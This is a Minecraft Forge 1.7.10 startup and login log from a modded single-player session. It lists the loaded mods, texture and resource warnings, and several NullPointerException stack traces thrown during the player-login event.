+[23:58:00] [Client thread/INFO]:   Unknown recipe class! me.superckl.dpu.common.crafting.RecipeExcludifierNBT Modder please refer to net.minecraftforge.oredict.RecipeSorter
+[23:58:00] [Client thread/INFO]: Forge Mod Loader has successfully loaded 28 mods
+[23:58:00] [Client thread/INFO]: Reloading ResourceManager: Default, FMLFileResourcePack:Forge Mod Loader, FMLFileResourcePack:Minecraft Forge, FMLFileResourcePack:Custom Ore Generation, FMLFileResourcePack:SpawnController, FMLFileResourcePack:bspkrsCore, FMLFileResourcePack:Damage Indicators, FMLFileResourcePack:Treecapitator, FMLFileResourcePack:Backpack, FMLFileResourcePack:Custom Chest Loot, FMLFileResourcePack:Don't Pick Up, FMLFileResourcePack:Ender Compass, FMLFileResourcePack:Ender Crop, FMLFileResourcePack:Enderman Disruptor Mod, FMLFileResourcePack:enhancedspawners2, FMLFileResourcePack:FireBallsForPlayers, FMLFileResourcePack:iChunUtil, FMLFileResourcePack:Insta House, FMLFileResourcePack:Instant Structures Mod (ISM), FMLFileResourcePack:More Gems + Mod, FMLFileResourcePack:Morph, FMLFileResourcePack:Nature's Compass, FMLFileResourcePack:Rei's Minimap, FMLFileResourcePack:Soul Shards: The Old Ways, FMLFileResourcePack: cTamed Mobs, FMLFileResourcePack:thehackermod, FMLFileResourcePack:WYEM
+[23:58:00] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: EnhancedSpawner.png in C:\Users\PC\AppData\Roaming\.minecraft\mods\EnhancedSpawners2-1.6.jar
+[23:58:00] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: FireBallsForPlayers in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:58:00] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: FireBallsForPlayers in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:58:00] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: FireBallsForPlayers in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:58:00] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: ModName in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:58:00] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: ModName in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:58:00] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: ModName in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:58:00] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: TestEnvironmentMod in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:58:00] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: TestEnvironmentMod in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:58:00] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: TestEnvironmentMod in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:58:00] [Client thread/INFO]: Created: 512x512 textures/blocks-atlas
+[23:58:00] [Client thread/INFO]: Created: 2048x1024 textures/items-atlas
+[23:58:00] [Client thread/INFO]: [paulscode.sound.SoundSystemLogger:message:69]: 
+[23:58:00] [Client thread/INFO]: [paulscode.sound.SoundSystemLogger:message:69]: SoundSystem shutting down...
+[23:58:00] [Client thread/INFO]: [paulscode.sound.SoundSystemLogger:importantMessage:90]:     Author: Paul Lamb, www.paulscode.com
+[23:58:00] [Client thread/INFO]: [paulscode.sound.SoundSystemLogger:message:69]: 
+[23:58:00] [Sound Library Loader/INFO]: [paulscode.sound.SoundSystemLogger:message:69]: 
+[23:58:00] [Sound Library Loader/INFO]: [paulscode.sound.SoundSystemLogger:message:69]: Starting up SoundSystem...
+[23:58:00] [Morph Online Resource Thread/INFO]: [0.9.3] Found and mapped ability mappings for 24 presumably Minecraft mobs.
+[23:58:00] [Client thread/INFO]: Enabling Main Menu Mob render ticker
+[23:58:00] [Client thread/ERROR]: +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
+[23:58:00] [Client thread/ERROR]: The following texture errors were found.
+[23:58:00] [Client thread/ERROR]: ==================================================
+[23:58:00] [Client thread/ERROR]:   DOMAIN minecraft
+[23:58:00] [Client thread/ERROR]: --------------------------------------------------
+[23:58:00] [Client thread/ERROR]:   domain minecraft is missing 1 texture
+[23:58:00] [Client thread/ERROR]:     domain minecraft has 3 locations:
+[23:58:00] [Client thread/ERROR]:       unknown resourcepack type net.minecraft.client.resources.DefaultResourcePack : Default
+[23:58:00] [Client thread/ERROR]:       mod FireBallsForPlayers resources at C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:58:00] [Client thread/ERROR]:       mod thehackermod resources at C:\Users\PC\AppData\Roaming\.minecraft\mods\The Hacker Mod 1.7 - 1.7.10.jar
+[23:58:00] [Client thread/ERROR]: -------------------------
+[23:58:00] [Client thread/ERROR]:     The missing resources for domain minecraft are:
+[23:58:00] [Client thread/ERROR]:       textures/blocks/MISSING_ICON_BLOCK_180_eSpawner.png
+[23:58:00] [Client thread/ERROR]: -------------------------
+[23:58:00] [Client thread/ERROR]:     No other errors exist for domain minecraft
+[23:58:00] [Client thread/ERROR]: ==================================================
+[23:58:00] [Client thread/ERROR]: +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
+[23:58:00] [Thread-35/INFO]: [paulscode.sound.SoundSystemLogger:message:69]: Initializing LWJGL OpenAL
+[23:58:00] [Thread-35/INFO]: [paulscode.sound.SoundSystemLogger:message:69]:     (The LWJGL binding of OpenAL.  For more information, see http://www.lwjgl.org)
+[23:58:00] [pool-2-thread-1/INFO]: defaultCustomTextures false
+[23:58:00] [Thread-35/INFO]: [paulscode.sound.SoundSystemLogger:message:69]: OpenAL initialized.
+[23:58:01] [Sound Library Loader/INFO]: [paulscode.sound.SoundSystemLogger:message:69]: 
+[23:58:01] [Sound Library Loader/INFO]: Sound engine started
+[23:58:24] [Client thread/INFO]: Disabling Main Menu Mob render ticker
+[23:58:25] [Client thread/INFO]: Enabling Main Menu Mob render ticker
+[23:58:26] [Client thread/INFO]: used the old auth tlauncher service
+[23:58:26] [Server thread/INFO]: Starting integrated minecraft server version 1.7.10
+[23:58:26] [Server thread/INFO]: Generating keypair
+[23:58:26] [Server thread/INFO]: Injecting existing block and item data into this server instance
+[23:58:26] [Server thread/INFO]: Applying holder lookups
+[23:58:26] [Server thread/INFO]: Holder lookups applied
+[23:58:26] [Server thread/INFO]: Loading dimension 0 (Minecraft 2025) (net.minecraft.server.integrated.IntegratedServer@1687bf41)
+[23:58:26] [Server thread/INFO]: Loading dimension 1 (Minecraft 2025) (net.minecraft.server.integrated.IntegratedServer@1687bf41)
+[23:58:26] [Server thread/INFO]: Loading config data for dimension 'C:\Users\PC\AppData\Roaming\.minecraft\saves\Minecraft 2025\DIM0' ...
+[23:58:26] [Server thread/INFO]: Loading config data for dimension 'C:\Users\PC\AppData\Roaming\.minecraft\saves\Minecraft 2025\DIM1' ...
+[23:58:26] [Server thread/INFO]: Loading dimension -1 (Minecraft 2025) (net.minecraft.server.integrated.IntegratedServer@1687bf41)
+[23:58:26] [Server thread/INFO]: Loading config data for dimension 'C:\Users\PC\AppData\Roaming\.minecraft\saves\Minecraft 2025\DIM-1' ...
+[23:58:26] [Server thread/INFO]: Loading config data for dimension 'C:\Users\PC\AppData\Roaming\.minecraft\saves\Minecraft 2025\DIM0' ...
+[23:58:26] [Server thread/INFO]: Preparing start region for level 0
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: java.lang.NoSuchMethodException: com.tamedmobs.entity.EntityTNTPrimedSmall.<init>(net.minecraft.world.World)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.lang.Class.getConstructor0(Unknown Source)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.lang.Class.getConstructor(Unknown Source)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at net.minecraft.entity.EntityList.func_75620_a(EntityList.java:122)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.yakman.enhancedspawners2.ESUtil.collectDataForMap(ESUtil.java:28)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.yakman.enhancedspawners2.EnhancedSpawners2.loadWorld(EnhancedSpawners2.java:85)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.lang.reflect.Method.invoke(Unknown Source)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at cpw.mods.fml.common.FMLModContainer.handleModStateEvent(FMLModContainer.java:532)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.reflect.GeneratedMethodAccessor2.invoke(Unknown Source)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.lang.reflect.Method.invoke(Unknown Source)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.common.eventbus.EventSubscriber.handleEvent(EventSubscriber.java:74)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.common.eventbus.SynchronizedEventSubscriber.handleEvent(SynchronizedEventSubscriber.java:47)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.common.eventbus.EventBus.dispatch(EventBus.java:322)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.common.eventbus.EventBus.dispatchQueuedEvents(EventBus.java:304)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.common.eventbus.EventBus.post(EventBus.java:275)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at cpw.mods.fml.common.LoadController.sendEventToModContainer(LoadController.java:212)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at cpw.mods.fml.common.LoadController.propogateStateMessage(LoadController.java:190)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.lang.reflect.Method.invoke(Unknown Source)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.common.eventbus.EventSubscriber.handleEvent(EventSubscriber.java:74)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.common.eventbus.SynchronizedEventSubscriber.handleEvent(SynchronizedEventSubscriber.java:47)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.common.eventbus.EventBus.dispatch(EventBus.java:322)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.common.eventbus.EventBus.dispatchQueuedEvents(EventBus.java:304)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.common.eventbus.EventBus.post(EventBus.java:275)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at cpw.mods.fml.common.LoadController.distributeStateMessage(LoadController.java:119)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at cpw.mods.fml.common.Loader.serverStarting(Loader.java:789)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at cpw.mods.fml.common.FMLCommonHandler.handleServerStarting(FMLCommonHandler.java:278)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at net.minecraft.server.integrated.IntegratedServer.func_71197_b(IntegratedServer.java:94)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at net.minecraft.server.MinecraftServer.run(MinecraftServer.java:387)
+[23:58:26] [Server thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at net.minecraft.server.MinecraftServer$2.run(MinecraftServer.java:685)
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.ESUtil:collectDataForMap:30]: ERROR: COULD NOT LOAD THIS ENTITY: TNTPrimedSmall
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Vaca
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Esqueleto
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Drag n del Fin
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: G lem de hierro
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Creeper
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Caballo
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Ara a
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Lobo
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Tamed Spider
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Zombi
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Ocelote
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Tamed Creeper
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Wither
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Cerdo
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Oveja
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Aldeano
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Ara a de cueva
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Murci lago
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Pollo
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Bruja
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Champi aca
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Calamar
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Slime
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Tamed Zombie
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Hombrecerdo zombi
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Zombi gigante
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: G lem de nieve
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Enderman
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Blaze
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Ghast
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Lepisma
+[23:58:26] [Server thread/INFO]: [com.yakman.enhancedspawners2.EnhancedSpawners2:loadWorld:88]: Slime magm tico
+[23:58:26] [Server thread/INFO]: Changing view distance to 12, from 10
+[23:58:26] [Client thread/INFO]: Disabling Main Menu Mob render ticker
+[23:58:27] [Netty Client IO #0/INFO]: Server protocol version 2
+[23:58:27] [Netty IO #1/INFO]: Client protocol version 2
+[23:58:27] [Netty IO #1/INFO]: Client attempting to join with 28 mods : spawncontroller@3.0.0,ism@2.6.1 MC-1.7.10,ReiMinimap@1.7.10,enhancedspawners2@0.2,thehackermod@1.7.10,DPU@1.2.40,Forge@10.13.4.1614,iChunUtil@4.2.3,CustomOreGen@1.2.1,cannibal321@1.0,instahouse@7.5,moddisruptor@0.2,Morph@0.9.3,bspkrsCore@6.16,mcp@9.05,TooManyItems@1.7.10,Treecapitator@1.7.10,tamedmobs@1.0,DamageIndicatorsMod@3.3.2,naturescompass@1.3.1,FML@7.10.99.99,SSTOW@1.7.10-0.1-RC9-7,endercrop@1.7.10-1.1,FireBallsForPlayers@0.5,CustomChestLoot@2.0.1,Backpack@2.0.1,endercompass@1.2,wyem@0.1.1.4
+[23:58:27] [Netty IO #1/INFO]: Attempting connection with missing mods [] at CLIENT
+[23:58:27] [Netty Client IO #0/INFO]: Attempting connection with missing mods [] at SERVER
+[23:58:27] [Server thread/INFO]: [Server thread] Server side modded connection established
+[23:58:27] [Client thread/INFO]: [Client thread] Client side modded connection established
+[23:58:27] [Server thread/INFO]: MineGamer303[local:E:2a694b67] logged in with entity id 216 at (17.5, 68.0, -6.5)
+[23:58:27] [Server thread/INFO]: MineGamer303 se ha unido a la partida
+[23:58:27] [Server thread/ERROR]: Exception caught during firing event cpw.mods.fml.common.gameevent.PlayerEvent$PlayerLoggedInEvent@15a7a0d8:
+java.lang.NullPointerException
+	at A.v.a(SourceFile:117) ~[v.class:?]
+	at D.c.a(SourceFile:43) ~[c.class:?]
+	at D.c.a(SourceFile:91) ~[c.class:?]
+	at cpw.mods.fml.common.eventhandler.ASMEventHandler_38_c_a_PlayerLoggedInEvent.invoke(.dynamic) ~[?:?]
+	at cpw.mods.fml.common.eventhandler.ASMEventHandler.invoke(ASMEventHandler.java:54) ~[ASMEventHandler.class:?]
+	at cpw.mods.fml.common.eventhandler.EventBus.post(EventBus.java:140) [EventBus.class:?]
+	at cpw.mods.fml.common.FMLCommonHandler.firePlayerLoggedIn(FMLCommonHandler.java:550) [FMLCommonHandler.class:?]
+	at net.minecraft.server.management.ServerConfigurationManager.initializeConnectionToPlayer(ServerConfigurationManager.java:180) [oi.class:?]
+	at cpw.mods.fml.common.network.handshake.NetworkDispatcher.completeServerSideConnection(NetworkDispatcher.java:190) [NetworkDispatcher.class:?]
+	at cpw.mods.fml.common.network.handshake.NetworkDispatcher.completeHandshake(NetworkDispatcher.java:463) [NetworkDispatcher.class:?]
+	at cpw.mods.fml.common.network.internal.HandshakeCompletionHandler.channelRead0(HandshakeCompletionHandler.java:17) [HandshakeCompletionHandler.class:?]
+	at cpw.mods.fml.common.network.internal.HandshakeCompletionHandler.channelRead0(HandshakeCompletionHandler.java:11) [HandshakeCompletionHandler.class:?]
+	at io.netty.channel.SimpleChannelInboundHandler.channelRead(SimpleChannelInboundHandler.java:98) [SimpleChannelInboundHandler.class:?]
+	at io.netty.channel.DefaultChannelHandlerContext.invokeChannelRead(DefaultChannelHandlerContext.java:337) [DefaultChannelHandlerContext.class:?]
+	at io.netty.channel.DefaultChannelHandlerContext.fireChannelRead(DefaultChannelHandlerContext.java:323) [DefaultChannelHandlerContext.class:?]
+	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103) [MessageToMessageDecoder.class:?]
+	at io.netty.handler.codec.MessageToMessageCodec.channelRead(MessageToMessageCodec.java:111) [MessageToMessageCodec.class:?]
+	at io.netty.channel.DefaultChannelHandlerContext.invokeChannelRead(DefaultChannelHandlerContext.java:337) [DefaultChannelHandlerContext.class:?]
+	at io.netty.channel.DefaultChannelHandlerContext.fireChannelRead(DefaultChannelHandlerContext.java:323) [DefaultChannelHandlerContext.class:?]
+	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:785) [DefaultChannelPipeline.class:?]
+	at io.netty.channel.embedded.EmbeddedChannel.writeInbound(EmbeddedChannel.java:169) [EmbeddedChannel.class:?]
+	at cpw.mods.fml.common.network.internal.FMLProxyPacket.func_148833_a(FMLProxyPacket.java:77) [FMLProxyPacket.class:?]
+	at net.minecraft.network.NetworkManager.func_74428_b(NetworkManager.java:212) [ej.class:?]
+	at net.minecraft.network.NetworkSystem.func_151269_c(NetworkSystem.java:165) [nc.class:?]
+	at net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:659) [MinecraftServer.class:?]
+	at net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:547) [MinecraftServer.class:?]
+	at net.minecraft.server.integrated.IntegratedServer.func_71217_p(IntegratedServer.java:111) [bsx.class:?]
+	at net.minecraft.server.MinecraftServer.run(MinecraftServer.java:427) [MinecraftServer.class:?]
+	at net.minecraft.server.MinecraftServer$2.run(MinecraftServer.java:685) [?:?]
+[23:58:27] [Server thread/ERROR]: Index: 6 Listeners:
+[23:58:27] [Server thread/ERROR]: 0: NORMAL
+[23:58:27] [Server thread/ERROR]: 1: ASM: Forge playerLogin(Lcpw/mods/fml/common/gameevent/PlayerEvent$PlayerLoggedInEvent;)V
+[23:58:27] [Server thread/ERROR]: 2: ASM: CustomOreGen.FMLInterface@6f81e89b onClientLogin(Lcpw/mods/fml/common/gameevent/PlayerEvent$PlayerLoggedInEvent;)V
+[23:58:27] [Server thread/ERROR]: 3: ASM: me.superckl.dpu.common.handler.ConnectionHandler@346fe9a9 onPlayerLogin(Lcpw/mods/fml/common/gameevent/PlayerEvent$PlayerLoggedInEvent;)V
+[23:58:27] [Server thread/ERROR]: 4: ASM: me.superckl.dpu.common.utlilty.VersionChecker@4b63e04c onPlayerLogin(Lcpw/mods/fml/common/gameevent/PlayerEvent$PlayerLoggedInEvent;)V
+[23:58:27] [Server thread/ERROR]: 5: ASM: ichun.common.iChunUtil@7c5fd4d4 onPlayerLogin(Lcpw/mods/fml/common/gameevent/PlayerEvent$PlayerLoggedInEvent;)V
+[23:58:27] [Server thread/ERROR]: 6: ASM: D.c@7758f478 a(Lcpw/mods/fml/common/gameevent/PlayerEvent$PlayerLoggedInEvent;)V
+[23:58:27] [Server thread/ERROR]: 7: ASM: morph.common.core.EventHandler@4c2d863 onPlayerLogin(Lcpw/mods/fml/common/gameevent/PlayerEvent$PlayerLoggedInEvent;)V
+[23:58:27] [Server thread/ERROR]: 8: ASM: bspkrs.treecapitator.ClientProxy@418f4427 onPlayerLoggedIn(Lcpw/mods/fml/common/gameevent/PlayerEvent$PlayerLoggedInEvent;)V
+[23:58:27] [Server thread/ERROR]: HandshakeCompletionHandler exception
+java.lang.NullPointerException
+	at A.v.a(SourceFile:117) ~[v.class:?]
+	at D.c.a(SourceFile:43) ~[c.class:?]
+	at D.c.a(SourceFile:91) ~[c.class:?]
+	at cpw.mods.fml.common.eventhandler.ASMEventHandler_38_c_a_PlayerLoggedInEvent.invoke(.dynamic) ~[?:?]
+	at cpw.mods.fml.common.eventhandler.ASMEventHandler.invoke(ASMEventHandler.java:54) ~[ASMEventHandler.class:?]
+	at cpw.mods.fml.common.eventhandler.EventBus.post(EventBus.java:140) ~[EventBus.class:?]
+	at cpw.mods.fml.common.FMLCommonHandler.firePlayerLoggedIn(FMLCommonHandler.java:550) ~[FMLCommonHandler.class:?]
+	at net.minecraft.server.management.ServerConfigurationManager.initializeConnectionToPlayer(ServerConfigurationManager.java:180) ~[oi.class:?]
+	at cpw.mods.fml.common.network.handshake.NetworkDispatcher.completeServerSideConnection(NetworkDispatcher.java:190) ~[NetworkDispatcher.class:?]
+	at cpw.mods.fml.common.network.handshake.NetworkDispatcher.completeHandshake(NetworkDispatcher.java:463) ~[NetworkDispatcher.class:?]
+	at cpw.mods.fml.common.network.internal.HandshakeCompletionHandler.channelRead0(HandshakeCompletionHandler.java:17) ~[HandshakeCompletionHandler.class:?]
+	at cpw.mods.fml.common.network.internal.HandshakeCompletionHandler.channelRead0(HandshakeCompletionHandler.java:11) ~[HandshakeCompletionHandler.class:?]
+	at io.netty.channel.SimpleChannelInboundHandler.channelRead(SimpleChannelInboundHandler.java:98) ~[SimpleChannelInboundHandler.class:?]
+	at io.netty.channel.DefaultChannelHandlerContext.invokeChannelRead(DefaultChannelHandlerContext.java:337) [DefaultChannelHandlerContext.class:?]
+	at io.netty.channel.DefaultChannelHandlerContext.fireChannelRead(DefaultChannelHandlerContext.java:323) [DefaultChannelHandlerContext.class:?]
+	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103) [MessageToMessageDecoder.class:?]
+	at io.netty.handler.codec.MessageToMessageCodec.channelRead(MessageToMessageCodec.java:111) [MessageToMessageCodec.class:?]
+	at io.netty.channel.DefaultChannelHandlerContext.invokeChannelRead(DefaultChannelHandlerContext.java:337) [DefaultChannelHandlerContext.class:?]
+	at io.netty.channel.DefaultChannelHandlerContext.fireChannelRead(DefaultChannelHandlerContext.java:323) [DefaultChannelHandlerContext.class:?]
+	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:785) [DefaultChannelPipeline.class:?]
+	at io.netty.channel.embedded.EmbeddedChannel.writeInbound(EmbeddedChannel.java:169) [EmbeddedChannel.class:?]
+	at cpw.mods.fml.common.network.internal.FMLProxyPacket.func_148833_a(FMLProxyPacket.java:77) [FMLProxyPacket.class:?]
+	at net.minecraft.network.NetworkManager.func_74428_b(NetworkManager.java:212) [ej.class:?]
+	at net.minecraft.network.NetworkSystem.func_151269_c(NetworkSystem.java:165) [nc.class:?]
+	at net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:659) [MinecraftServer.class:?]
+	at net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:547) [MinecraftServer.class:?]
+	at net.minecraft.server.integrated.IntegratedServer.func_71217_p(IntegratedServer.java:111) [bsx.class:?]
+	at net.minecraft.server.MinecraftServer.run(MinecraftServer.java:427) [MinecraftServer.class:?]
+	at net.minecraft.server.MinecraftServer$2.run(MinecraftServer.java:685) [?:?]
+[23:58:27] [Server thread/ERROR]: There was a critical exception handling a packet on channel FML
+java.lang.NullPointerException
+	at A.v.a(SourceFile:117) ~[v.class:?]
+	at D.c.a(SourceFile:43) ~[c.class:?]
+	at D.c.a(SourceFile:91) ~[c.class:?]
+	at cpw.mods.fml.common.eventhandler.ASMEventHandler_38_c_a_PlayerLoggedInEvent.invoke(.dynamic) ~[?:?]
+	at cpw.mods.fml.common.eventhandler.ASMEventHandler.invoke(ASMEventHandler.java:54) ~[ASMEventHandler.class:?]
+	at cpw.mods.fml.common.eventhandler.EventBus.post(EventBus.java:140) ~[EventBus.class:?]
+	at cpw.mods.fml.common.FMLCommonHandler.firePlayerLoggedIn(FMLCommonHandler.java:550) ~[FMLCommonHandler.class:?]
+	at net.minecraft.server.management.ServerConfigurationManager.initializeConnectionToPlayer(ServerConfigurationManager.java:180) ~[oi.class:?]
+	at cpw.mods.fml.common.network.handshake.NetworkDispatcher.completeServerSideConnection(NetworkDispatcher.java:190) ~[NetworkDispatcher.class:?]
+	at cpw.mods.fml.common.network.handshake.NetworkDispatcher.completeHandshake(NetworkDispatcher.java:463) ~[NetworkDispatcher.class:?]
+	at cpw.mods.fml.common.network.internal.HandshakeCompletionHandler.channelRead0(HandshakeCompletionHandler.java:17) ~[HandshakeCompletionHandler.class:?]
+	at cpw.mods.fml.common.network.internal.HandshakeCompletionHandler.channelRead0(HandshakeCompletionHandler.java:11) ~[HandshakeCompletionHandler.class:?]
